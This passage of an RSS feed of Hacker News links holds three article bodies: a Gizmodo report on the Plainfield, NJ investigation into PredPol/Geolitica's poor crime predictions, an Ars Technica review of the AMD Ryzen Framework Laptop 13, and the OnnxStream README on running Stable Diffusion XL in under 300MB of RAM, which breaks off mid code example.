            <description><![CDATA[<p>URL: <a href="https://gizmodo.com/predictive-policing-cops-law-enforcement-predpol-1850893951">https://gizmodo.com/predictive-policing-cops-law-enforcement-predpol-1850893951</a>, See on <a href="https://news.ycombinator.com/item?id=37753079">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><figure data-id="f038a16dedea41bd25c57efa7a87ca97" data-recommend-id="image://f038a16dedea41bd25c57efa7a87ca97" data-format="jpg" data-width="6720" data-height="3780" data-lightbox="true" data-recommended="true" data-hide="false" contenteditable="false" draggable="false"><div contenteditable="false" data-link-reference="" data-link-target="" data-syndicationrights="true" data-imagerights="shutterstock" data-hide="false" data-hidecredit="false"><p><span><div><picture><source media="(max-width: 37.31em)" type="image/jpeg" srcset="https://i.kinja-img.com/image/upload/c_fit,f_auto,g_center,q_60,w_645/f038a16dedea41bd25c57efa7a87ca97.jpg"><source media="(min-width: 37.37em)" type="image/jpeg" srcset="https://i.kinja-img.com/image/upload/c_fit,f_auto,g_center,q_60,w_1315/f038a16dedea41bd25c57efa7a87ca97.jpg"><img alt="Image for article titled Study Finds Predictive Policing Software Is Actually Pretty Terrible at Predicting Crimes" data-chomp-id="f038a16dedea41bd25c57efa7a87ca97" data-format="jpg" data-alt="Image for article titled Study Finds Predictive Policing Software Is Actually Pretty Terrible at Predicting Crimes" data-anim-src="" src="https://i.kinja-img.com/image/upload/c_fit,f_auto,g_center,q_60,w_645/f038a16dedea41bd25c57efa7a87ca97.jpg"></picture></div></span></p><p><figcaption>Image<!-- -->: <!-- -->zef art<!-- --> (<!-- -->Shutterstock<!-- -->)</figcaption></p></div><span data-id="f038a16dedea41bd25c57efa7a87ca97" data-recommend-id="image://f038a16dedea41bd25c57efa7a87ca97" data-format="jpg" data-width="6720" data-height="3780" data-lightbox="true" data-recommended="true" data-hide="false"></span></figure><div><p>Predictive policing—the trendy law enforcement field that uses data collection and analysis to try <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/crime-prediction-software-promised-to-be-free-of-biases-1848138977&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/crime-prediction-software-promised-to-be-free-of-biases-1848138977">to predict where crimes will occur</a></span>—has been wildly popular with police departments  across the country. Unfortunately, though some cops <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.police1.com/police-leader-playbook/articles/how-a-nebraska-police-chief-has-leveraged-technology-and-predictive-policing-to-decrease-crime-XpUVclO7j3qzXMAy/&quot;,{&quot;metric25&quot;:1}]]" href="https://www.police1.com/police-leader-playbook/articles/how-a-nebraska-police-chief-has-leveraged-technology-and-predictive-policing-to-decrease-crime-XpUVclO7j3qzXMAy/" target="_blank" rel="noopener noreferrer">swear by it</a></span>, there hasn’t always been a ton of evidence <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://thenewstack.io/predictive-policing-real-just-not-effective/&quot;,{&quot;metric25&quot;:1}]]" href="https://thenewstack.io/predictive-policing-real-just-not-effective/" target="_blank" rel="noopener noreferrer">that the tech actually works</a></span> that well. In fact, a new study, released this week, seems to suggest that—for one community at least—it’s been pretty much a total waste of time.</p><div data-video-id="195771" data-monetizable="true" data-position="sidebar" data-video-title="Taylor Lorenz Talks &quot;Extremely Online&quot;" data-video-blog-id="4" data-video-network="gizmodo" data-video-duration="170" data-playlist="195771,195747,195726" data-current="195771"><div><p>Taylor Lorenz Talks "Extremely Online"</p></div><video disablepictureinpicture="" muted="" playsinline="" width="100%" height="100%" crossorigin="anonymous" preload="none"><source data-src="https://vid.kinja.com/prod/195771/195771_240p.mp4" label="240p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/195771/195771_480p.mp4" label="480p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/195771/195771_720p.mp4" label="720p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/195771/195771_1080p.mp4" label="1080p" type="video/mp4"><track kind="captions" label="English" src="https://kinja.com/api/videoupload/caption/21281.vtt" srclang="en"></video><div><ul><li data-label="">Off</li><li data-label="English">English</li></ul></div></div><p>A new joint investigation by <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://themarkup.org/prediction-bias/2023/10/02/predictive-policing-software-terrible-at-predicting-crimes&quot;,{&quot;metric25&quot;:1}]]" href="https://themarkup.org/prediction-bias/2023/10/02/predictive-policing-software-terrible-at-predicting-crimes" target="_blank" rel="noopener noreferrer">The Markup</a></span> and <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.wired.com/story/plainfield-geolitica-crime-predictions/&quot;,{&quot;metric25&quot;:1}]]" href="https://www.wired.com/story/plainfield-geolitica-crime-predictions/" target="_blank" rel="noopener noreferrer">Wired</a></span> shows that, for the city of Plainfield, New Jersey, predictive policing has been a giant, expensive mess—one that produced almost zero helpful results. </p><p>Both outlets looked into a large dataset provided by Plainfield PD that involved some 23,631 predictions made by  Geolitica, a crime prediction software. Geolitica (which was previously called PredPol <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://blog.predpol.com/geolitica-a-new-name-a-new-focus&quot;,{&quot;metric25&quot;:1}]]" href="https://blog.predpol.com/geolitica-a-new-name-a-new-focus" target="_blank" rel="noopener noreferrer">but rebranded</a></span> two years ago) claims to use “data-driven strategies” to help police identify so-called “hot spots”—places where crime is most likely to occur.  However, the dataset provided by the Plainfield PD showed that—during a roughly ten-month period, between Feb. 25 to Dec. 18, 2018—the software accurately predicted where crimes would occur with a “less than half a percent” success rate. </p><p>Captain David Guarino, of the Plainfield Police Department, seems to have been pretty upfront about the software’s shortcomings. He told The Markup: </p><blockquote data-type="BlockQuote"><p>“Why did we get PredPol? I guess we wanted to be more effective when it came to reducing crime. And having a prediction where we should be would help us to do that. I don’t know that it did that...I don’t believe we really used it that often, if at all. That’s why we ended up getting rid of it.”</p></blockquote><p>Gizmodo and The Markup previously collaborated on an investigation into Predpol’s software, finding that cops used it to <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/how-we-determined-predictive-policing-software-dispropo-1848139456&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/how-we-determined-predictive-policing-software-dispropo-1848139456">disproportionately targeted low-income communities of color</a></span>. <br></p><p>We reached out to Geolitica for comment on the recent study’s findings and will update this story if we receive a response. Wired <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.wired.com/story/soundthinking-geolitica-acquisition-predictive-policing/&quot;,{&quot;metric25&quot;:1}]]" href="https://www.wired.com/story/soundthinking-geolitica-acquisition-predictive-policing/" target="_blank" rel="noopener noreferrer">previously reported</a></span> that the company is planning to cease operations at the end of this year; some of its team have already been hired by a different law enforcement company. </p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Review: Framework Laptop finally gets an AMD Ryzen config–and it’s pretty good (161 pts)]]></title>
            <link>https://arstechnica.com/gadgets/2023/10/review-framework-laptop-finally-gets-an-amd-ryzen-config-and-its-pretty-good/</link>
            <guid>37752950</guid>
            <pubDate>Tue, 03 Oct 2023 15:10:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/gadgets/2023/10/review-framework-laptop-finally-gets-an-amd-ryzen-config-and-its-pretty-good/">https://arstechnica.com/gadgets/2023/10/review-framework-laptop-finally-gets-an-amd-ryzen-config-and-its-pretty-good/</a>, See on <a href="https://news.ycombinator.com/item?id=37752950">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
                                    
  




<!-- cache hit 53:single/related:47534ee0e696b9a8ad1fcc011a863361 --><!-- empty -->
  <div>
    <ul>
              <li data-thumb="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1032-150x150.jpeg" data-src="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1032.jpeg" data-responsive="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1032-980x653.jpeg 1080, https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1032-1440x960.jpeg 2560" data-sub-html="#caption-1972735">
          <figure>
            
                          <figcaption id="caption-1972735">
                <span></span>
                                  <p>
                    This is the Framework Laptop 13. We're using the same pictures as a previous review because it's the exact same laptop.                   </p>
                                                  <p><span></span>
                                          Andrew Cunningham                                      </p>
                              </figcaption>
                      </figure>
        </li>
              <li data-thumb="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1042-150x150.jpeg" data-src="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1042.jpeg" data-responsive="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1042-980x653.jpeg 1080, https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1042-1440x960.jpeg 2560" data-sub-html="#caption-1972738">
          <figure>
            
                          <figcaption id="caption-1972738">
                <span></span>
                                  <p>
                    And the same keyboard and trackpad.                  </p>
                                                  <p><span></span>
                                          Andrew Cunningham                                      </p>
                              </figcaption>
                      </figure>
        </li>
              <li data-thumb="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1034-150x150.jpeg" data-src="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1034.jpeg" data-responsive="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1034-980x653.jpeg 1080, https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_1034-1440x960.jpeg 2560" data-sub-html="#caption-1972737">
          <figure>
            
                          <figcaption id="caption-1972737">
                <span></span>
                                  <p>
                    And the same lid.                  </p>
                                                  <p><span></span>
                                          Andrew Cunningham                                      </p>
                              </figcaption>
                      </figure>
        </li>
          </ul>
  </div>

<table>
<tbody>
<tr>
<th colspan="2">Specs at a glance: Framework Laptop 13 (2023)</th>
</tr>
<tr>
<th>OS</th>
<td>Windows 11 22H2</td>
</tr>
<tr>
<th>CPU</th>
<td>AMD Ryzen 7 7840U (8-cores)</td>
</tr>
<tr>
<th>RAM</th>
<td>32GB DDR5-5600 (upgradeable)</td>
</tr>
<tr>
<th>GPU</th>
<td>AMD Radeon 780M (integrated)</td>
</tr>
<tr>
<th>SSD</th>
<td>1TB Western Digital Black SN770</td>
</tr>
<tr>
<th>Battery</th>
<td>61 WHr</td>
</tr>
<tr>
<th>Display</th>
<td>13.5-inch 2256x1504 non-touchscreen in glossy or matte</td>
</tr>
<tr>
<th>Connectivity</th>
<td>4x recessed USB-C ports (2x USB 4, 2x USB 3.2) with customizable "Expansion Card" dongles, headphone jack</td>
</tr>
<tr>
<th>Price as tested</th>
<td><a href="https://tinyurl.com/2zhubuf7" target="_blank" rel="noopener">$1,679</a> pre-built, $1,523 DIY edition with no OS included</td>
</tr>
</tbody>
</table>
<p>The Framework Laptop 13 is back again.</p>
<p>My third review of this laptop is probably the one that I (and many Framework-curious PC buyers) have been the most interested to test, as the company has finally added <a href="https://tinyurl.com/2zhubuf7" target="_blank" rel="noopener">an AMD Ryzen option</a> to the repair-friendly portable. Updates to the Intel version of the Framework Laptop have boosted CPU performance, but its graphics performance has been at a standstill since the Framework Laptop <a href="https://arstechnica.com/gadgets/2021/07/frameworks-new-lightweight-modular-laptop-delivers-on-its-promises/">originally hit the scene</a> in mid-2021.</p>
<p>Even AMD's latest integrated graphics won't make a thin-and-light laptop a replacement for a gaming PC with dedicated graphics, but a bit more GPU power makes the Framework Laptop that much more versatile, making it easier to play games at reasonable resolutions and settings than it is on Intel's aging Iris Xe graphics hardware.</p>
<p>Whether you hopped on the Framework train early and have been waiting for a motherboard that felt like a true all-around upgrade or you've been on the fence about buying your first Framework Laptop, the new Ryzen version makes a good case for itself. If you want to order one, there's currently a backlog—all versions are shipping at an unspecified date in "Q4."</p>
<h2>Meet the Ryzen-powered Framework 13</h2>
<figure><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_0054.jpeg" data-height="1920" data-width="2560" alt="The Ryzen version of the Framework Laptop's system board has the same shape and layout as the Intel versions, preserving full compatibility with older Framework Laptop 13 enclosures."><img alt="The Ryzen version of the Framework Laptop's system board has the same shape and layout as the Intel versions, preserving full compatibility with older Framework Laptop 13 enclosures." src="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_0054-980x735.jpeg" width="980" height="735"></a><figcaption><p><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_0054.jpeg" data-height="1920" data-width="2560">Enlarge</a> <span>/</span> The Ryzen version of the Framework Laptop's system board has the same shape and layout as the Intel versions, preserving full compatibility with older Framework Laptop 13 enclosures.</p><p>Andrew Cunningham</p></figcaption></figure>
<p>I won't spend a lot of time talking about the design of the Framework Laptop 13 again, except to say that it remains a competent ultraportable, and there's nothing that feels dated or clunky about its design now that didn't already feel a little dated and clunky two years ago (the relatively thick display bezel is the main culprit here). Another laptop in this category we generally like, <a href="https://arstechnica.com/gadgets/2023/06/lenovo-thinkpad-x1-carbon-gen-11-review-two-steps-forward-one-step-back/">Lenovo's ThinkPad X1 Carbon</a>, has been using the same basic design for years, so it's not like Framework is in danger of falling behind in a chaotic and fast-paced industry.</p>                                            
                                                        
<p>The Ryzen version of the mainboard looks mostly identical to the Intel version, given that it needs to fit in all the same cases with all the same connectors. It dropped directly into the same case I've also used for the Intel versions of the Framework Laptop, and moving from Intel to AMD is as easy as it is in a desktop tower with standard parts.</p>
<figure><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_0056.jpeg" data-height="1920" data-width="2560" alt="The label on the board is one of the few indicators that you're using an AMD board."><img alt="The label on the board is one of the few indicators that you're using an AMD board." src="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_0056-980x735.jpeg" width="980" height="735"></a><figcaption><p><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/10/IMG_0056.jpeg" data-height="1920" data-width="2560">Enlarge</a> <span>/</span> The label on the board is one of the few indicators that you're using an AMD board.</p><p>Andrew Cunningham</p></figcaption></figure>

<p>But it wouldn't be a Ryzen system if there weren't a couple of weird, fiddly things about it! All the Intel Framework Laptops have supported the same specifications for all four ports (USB 4 for the 11th-gen, Thunderbolt 4 for the newer ones), allowing you to install the expansion card modules wherever you want them without worrying about the particulars.</p>
<p>The Ryzen laptop supports USB 4 in the rear-left and rear-right ports, USB 3.2 and DisplayPort for the front-right slot, and only USB 3.2 on the front-left slot (all four ports support USB-PD for charging, though). Framework also says the rear ports enter a "high-power mode" when USB-A modules are connected to them, which can reduce battery life.</p>
<p>So yes, the Framework Laptop's ports are still customizable, and you can still have a lot of flexibility when installing expansion modules. But some modules are better fits for specific ports, and you'll have to be a bit more careful about where you put things if you want the best performance and battery life.</p>

                                                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Running Stable Diffusion XL 1.0 in 298MB of RAM (438 pts)]]></title>
            <link>https://github.com/vitoplantamura/OnnxStream/tree/846da873570a737b49154e8f835704264864b0fe</link>
            <guid>37752632</guid>
            <pubDate>Tue, 03 Oct 2023 14:43:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/vitoplantamura/OnnxStream/tree/846da873570a737b49154e8f835704264864b0fe">https://github.com/vitoplantamura/OnnxStream/tree/846da873570a737b49154e8f835704264864b0fe</a>, See on <a href="https://news.ycombinator.com/item?id=37752632">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><p dir="auto"><strong>📣 UPDATE (OCTOBER 2023) 📣 Added support for Stable Diffusion XL 1.0 Base! And it runs on a RPI Zero 2! Please see the section below 👇</strong></p>
<h2 tabindex="-1" id="user-content-onnxstream" dir="auto"><a href="#onnxstream">OnnxStream</a></h2>
<p dir="auto">The challenge is to run <a href="https://github.com/CompVis/stable-diffusion">Stable Diffusion</a> 1.5, which includes a large transformer model with almost 1 billion parameters, on a <a href="https://www.raspberrypi.com/products/raspberry-pi-zero-2-w/" rel="nofollow">Raspberry Pi Zero 2</a>, which is a microcomputer with 512MB of RAM, without adding more swap space and without offloading intermediate results on disk. The recommended minimum RAM/VRAM for Stable Diffusion is typically 8GB.</p>
<p dir="auto">Generally major machine learning frameworks and libraries are focused on minimizing inference latency and/or maximizing throughput, all of which at the cost of RAM usage. So I decided to write a super small and hackable inference library specifically focused on minimizing memory consumption: OnnxStream.</p>
<p dir="auto">OnnxStream is based on the idea of decoupling the inference engine from the component responsible of providing the model weights, which is a class derived from <code>WeightsProvider</code>. A <code>WeightsProvider</code> specialization can implement any type of loading, caching and prefetching of the model parameters. For example a custom <code>WeightsProvider</code> can decide to download its data from an HTTP server directly, without loading or writing anything to disk (hence the word "Stream" in "OnnxStream"). Two default <code>WeightsProviders</code> are available: <code>DiskNoCache</code> and <code>DiskPrefetch</code>.</p>
<p dir="auto"><strong>OnnxStream can consume even 55x less memory than OnnxRuntime while being only 0.5-2x slower</strong> (on CPU, see the Performance section below).</p>
<h2 tabindex="-1" id="user-content-stable-diffusion-15" dir="auto"><a href="#stable-diffusion-15">Stable Diffusion 1.5</a></h2>
<p dir="auto">These images were generated by the Stable Diffusion example implementation included in this repo, using OnnxStream, at different precisions of the VAE decoder. The VAE decoder is the only model of Stable Diffusion that could not fit into the RAM of the Raspberry Pi Zero 2 in single or half precision. This is caused by the presence of residual connections and very big tensors and convolutions in the model. The only solution was static quantization (8 bit). The third image was generated by my RPI Zero 2 in about <del>3 hours</del> 1.5 hours (using the MAX_SPEED option when compiling). The first image was generated on my PC using the same latents generated by the RPI Zero 2, for comparison:</p>
<p dir="auto">VAE decoder in W16A16 precision:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/output_W16A16.png"><img src="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/output_W16A16.png" alt="W16A16 VAE Decoder"></a></p>
<p dir="auto">VAE decoder in W8A32 precision:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/output_W8A32.png"><img src="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/output_W8A32.png" alt="W8A32 VAE Decoder"></a></p>
<p dir="auto">VAE decoder in W8A8 precision, generated by my RPI Zero 2 in about <del>3 hours</del> 1.5 hours (using the MAX_SPEED option when compiling):</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/output_W8A8.png"><img src="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/output_W8A8.png" alt="W8A8 VAE Decoder"></a></p>
<h2 tabindex="-1" id="user-content-stable-diffusion-xl-10-base" dir="auto"><a href="#stable-diffusion-xl-10-base">Stable Diffusion XL 1.0 (base)</a></h2>
<p dir="auto">The OnnxStream Stable Diffusion example implementation now supports SDXL 1.0 (without the Refiner). The ONNX files were exported from the SDXL 1.0 implementation of the Hugging Face's <a href="https://github.com/huggingface/diffusers">Diffusers</a> library (version 0.19.3).</p>
<p dir="auto">SDXL 1.0 is significantly more computationally expensive than SD 1.5. The most significant difference is the ability to generate 1024x1024 images instead of 512x512. To give you an idea, generating a 10-steps image with HF's Diffusers takes 26 minutes on my 12-core PC with 32GB of RAM. The minimum recommended VRAM for SDXL is typically 12GB.</p>
<p dir="auto"><strong>OnnxStream can run SDXL 1.0 in less than 300MB of RAM and therefore is able to run it comfortably on a RPI Zero 2</strong>, without adding more swap space and without writing anything to disk during inference. Generating a 10-steps image takes about 11 hours on my RPI Zero 2.</p>
<h4 tabindex="-1" id="user-content-sdxl-specific-optimizations" dir="auto"><a href="#sdxl-specific-optimizations">SDXL Specific Optimizations</a></h4>
<p dir="auto">The same set of optimizations for SD 1.5 has been used for SDXL 1.0, but with the following differences.</p>
<p dir="auto">As for the UNET model, in order to make it run in less than 300MB of RAM on the RPI Zero 2, UINT8 dynamic quantization is used, but limited to a specific subset of large intermediate tensors.</p>
<p dir="auto">The situation for the VAE decoder is more complex than for SD 1.5. SDXL 1.0's VAE decoder is 4x the size of SD 1.5's, and consumes 4.4GB of RAM when run with OnnxStream in FP32 precision.</p>
<p dir="auto">In the case of SD 1.5 the VAE decoder is statically quantized (UINT8 precision) and this is enough to reduce RAM consumption to 260MB. Instead, the SDXL 1.0's VAE decoder overflows when run with FP16 arithmetic and the numerical ranges of its activations are too large to get good quality images with UINT8 quantization.</p>
<p dir="auto">So we are stuck with a model that consumes 4.4GB of RAM, which cannot be run in FP16 precision and which cannot be quantized in UINT8 precision. (NOTE: there is at least <a href="https://huggingface.co/madebyollin/sdxl-vae-fp16-fix" rel="nofollow">one solution</a> to the FP16 problem, but I have not investigated further since even running the VAE decoder in FP16 precision, the total memory consumed would be divided by 2, so the model would ultimately consume 2.2GB instead of 4.4GB, which is still way too much for the RPI Zero 2)</p>
<p dir="auto">The inspiration for the solution came from the implementation of the VAE decoder of the Hugging Face's <a href="https://github.com/huggingface/diffusers/blob/main/src/diffusers/models/autoencoder_kl.py">Diffusers</a> library, i.e. using tiled decoding. The final result is absolutely indistinguishable from an image decoded by the full decoder and in this way it is possible to reduce RAM memory consumption from 4.4GB to 298MB!</p>
<p dir="auto">The idea is simple. The result of the diffusion process is a tensor with shape (1,4,128,128). The idea is to split this tensor into 5x5 (therefore 25) overlapping tensors with shape (1,4,32,32) and to decode these tensors separately. Each of these tensors is overlapped by 25% on the tile to its left and the one above. The decoding result is a tensor with shape (1,3,256,256) which is then appropriately blended into the final image.</p>
<p dir="auto">For example, this is an image generated by the tiled decoder with blending manually turned off in the code. <strong>You can clearly see the tiles in the image:</strong></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/sdxl_tiles.png"><img src="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/sdxl_tiles.png" alt="SDXL Output with Tiles"></a></p>
<p dir="auto">While this is the same image with blending turned on. <strong>This is the final result:</strong></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/sdxl_without_tiles.png"><img src="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/sdxl_without_tiles.png" alt="SDXL Output without Tiles"></a></p>
<p dir="auto">This is another image generated by my RPI Zero 2 in about 11 hours: (10 steps, Euler Ancestral)</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/sdxl_out_1.png"><img src="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/sdxl_out_1.png" alt="SDXL Output generated by RPI Zero 2"></a></p>
<h2 tabindex="-1" id="user-content-features-of-onnxstream" dir="auto"><a href="#features-of-onnxstream">Features of OnnxStream</a></h2>
<ul dir="auto">
<li>Inference engine decoupled from the <code>WeightsProvider</code></li>
<li><code>WeightsProvider</code> can be <code>DiskNoCache</code>, <code>DiskPrefetch</code> or custom</li>
<li>Attention slicing</li>
<li>Dynamic quantization (8 bit unsigned, asymmetric, percentile)</li>
<li>Static quantization (W8A8 unsigned, asymmetric, percentile)</li>
<li>Easy calibration of a quantized model</li>
<li>FP16 support (with or without FP16 arithmetic)</li>
<li>25 ONNX operators implemented (the most common)</li>
<li>Operations executed sequentially but all operators are multithreaded</li>
<li>Single implementation file + header file</li>
<li>XNNPACK calls wrapped in the <code>XnnPack</code> class (for future replacement)</li>
</ul>
<p dir="auto">OnnxStream depends on <a href="https://github.com/google/XNNPACK">XNNPACK</a> for some (accelerated) primitives: MatMul, Convolution, element-wise Add/Sub/Mul/Div, Sigmoid and Softmax.</p>
<h2 tabindex="-1" id="user-content-performance" dir="auto"><a href="#performance">Performance</a></h2>
<p dir="auto">Stable Diffusion consists of three models: <strong>a text encoder</strong> (672 operations and 123 million parameters), the <strong>UNET model</strong> (2050 operations and 854 million parameters) and the <strong>VAE decoder</strong> (276 operations and 49 million parameters). Assuming that the batch size is equal to 1, a full image generation with 10 steps, which yields good results (with the Euler Ancestral scheduler), requires 2 runs of the text encoder, 20 (i.e. 2*10) runs of the UNET model and 1 run of the VAE decoder.</p>
<p dir="auto">This table shows the various inference times of the three models of Stable Diffusion, together with the memory consumption (i.e. the <code>Peak Working Set Size</code> in Windows or the <code>Maximum Resident Set Size</code> in Linux).</p>
<table>
<thead>
<tr>
<th>Model / Library</th>
<th>1st run</th>
<th>2nd run</th>
<th>3rd run</th>
</tr>
</thead>
<tbody>
<tr>
<td>FP16 UNET / OnnxStream</td>
<td>0.133 GB - 18.2 secs</td>
<td>0.133 GB - 18.7 secs</td>
<td>0.133 GB - 19.8 secs</td>
</tr>
<tr>
<td>FP16 UNET / OnnxRuntime</td>
<td>5.085 GB - 12.8 secs</td>
<td>7.353 GB - 7.28 secs</td>
<td>7.353 GB - 7.96 secs</td>
</tr>
<tr>
<td>FP32 Text Enc / OnnxStream</td>
<td>0.147 GB - 1.26 secs</td>
<td>0.147 GB - 1.19 secs</td>
<td>0.147 GB - 1.19 secs</td>
</tr>
<tr>
<td>FP32 Text Enc / OnnxRuntime</td>
<td>0.641 GB - 1.02 secs</td>
<td>0.641 GB - 0.06 secs</td>
<td>0.641 GB - 0.07 secs</td>
</tr>
<tr>
<td>FP32 VAE Dec / OnnxStream</td>
<td>1.004 GB - 20.9 secs</td>
<td>1.004 GB - 20.6 secs</td>
<td>1.004 GB - 21.2 secs</td>
</tr>
<tr>
<td>FP32 VAE Dec / OnnxRuntime</td>
<td>1.330 GB - 11.2 secs</td>
<td>2.026 GB - 10.1 secs</td>
<td>2.026 GB - 11.1 secs</td>
</tr>
</tbody>
</table>
<p dir="auto">In the case of the UNET model (when run in FP16 precision, with FP16 arithmetic enabled in OnnxStream), OnnxStream can consume even 55x less memory than OnnxRuntime while being 0.5-2x slower.</p>
<p dir="auto">Notes:</p>
<ul dir="auto">
<li>The first run for OnnxRuntime is a warm up inference, since its <code>InferenceSession</code> is created before the first run and reused for all the subsequent runs. No such thing as a warm up exists for OnnxStream since it is purely eager by design (however subsequent runs can benefit from the caching of the weights files by the OS).</li>
<li>At the moment OnnxStream doesn't support inputs with a batch size != 1, unlike OnnxRuntime, which can greatly speed up the whole diffusion process using a batch size = 2 when running the UNET model.</li>
<li>In my tests, changing OnnxRuntime's <code>SessionOptions</code> (like <code>EnableCpuMemArena</code> and <code>ExecutionMode</code>) produces no significant difference in the results.</li>
<li>Performance of OnnxRuntime is very similar to that of NCNN (the other framework I evaluated), both in terms of memory consumption and inference time. I'll include NCNN benchmarks in the future, if useful.</li>
<li>Tests were run on my development machine: Windows Server 2019, 16GB RAM, 8750H cpu (AVX2), 970 EVO Plus SSD, 8 virtual cores on VMWare.</li>
</ul>
<h2 tabindex="-1" id="user-content-attention-slicing-and-quantization" dir="auto"><a href="#attention-slicing-and-quantization">Attention Slicing and Quantization</a></h2>
<p dir="auto">The use of "attention slicing" when running the UNET model and the use of W8A8 quantization for the VAE decoder were crucial in reducing memory consumption to a level that allowed execution on a RPI Zero 2.</p>
<p dir="auto">While there is a lot of information on the internet about quantizing neural networks, little can be found about "attention slicing". The idea is simple: the goal is to avoid materializing the full <code>Q @ K^T</code> matrix when calculating the scaled dot-product attention of the various multi-head attentions in the UNET model. With an attention head count of 8 in the UNET model, <code>Q</code> has a shape of (8,4096,40), while <code>K^T</code> has a shape of (8,40,4096): so the result of the first MatMul has a final shape of (8,4096,4096), which is a 512MB tensor (in FP32 precision):</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/attention_mem_consumpt.png"><img src="https://raw.githubusercontent.com/vitoplantamura/OnnxStream/master/assets/attention_mem_consumpt.png" alt="Attention Slicing"></a></p>
<p dir="auto">The solution is to split <code>Q</code> vertically and then to proceed with the attention operations normally on each chunk of <code>Q</code>. <code>Q_sliced</code> has a shape of (1,x,40), where x is 4096 (in this case) divided by <code>onnxstream::Model::m_attention_fused_ops_parts</code> (which has a default value of 2, but can be customized). This simple trick allows to lower the overall consumed memory of the UNET model from 1.1GB to 300MB (when the model is run in FP32 precision). A possible alternative, certainly more efficient, would be to use FlashAttention, however FlashAttention would require writing a custom kernel for each supported architecture (AVX, NEON etc), bypassing XnnPack in our case.</p>
<h2 tabindex="-1" id="user-content-how-onnxstream-works" dir="auto"><a href="#how-onnxstream-works">How OnnxStream works</a></h2>
<p dir="auto">This code can run a model defined in the <code>path_to_model_folder/model.txt</code>: (all the model operations are defined in the <code>model.txt</code> text file; OnnxStream expects to find all the weights files in that same folder, as a series of <code>.bin</code> files)</p>
<div dir="auto" data-snippet-clipboard-copy-content="#include &quot;onnxstream.h&quot;

using namespace onnxstream;

int main()
{
    Model model;

    //
    // Optional parameters that can be set on the Model object:
    //
    // model.set_weights_provider( ... ); // specifies a different weights provider (default is DiskPrefetchWeightsProvider)
    // model.read_range_data( ... ); // reads a range data file (which contains the clipping ranges of the activations for a quantized model)
    // model.write_range_data( ... ); // writes a range data file (useful after calibration)
    // model.m_range_data_calibrate = true; // calibrates the model
    // model.m_use_fp16_arithmetic = true; // uses FP16 arithmetic during inference (useful if weights are in FP16 precision)
    // model.m_use_uint8_arithmetic = true; // uses UINT8 arithmetic during inference
    // model.m_use_uint8_qdq = true; // uses UINT8 dynamic quantization (can reduce memory consumption of some models)
    // model.m_fuse_ops_in_attention = true; // enables attention slicing
    // model.m_attention_fused_ops_parts = ... ; // see the &quot;Attention Slicing&quot; section above
    //

    model.read_file(&quot;path_to_model_folder/model.txt&quot;);

    tensor_vector<float> data;
    
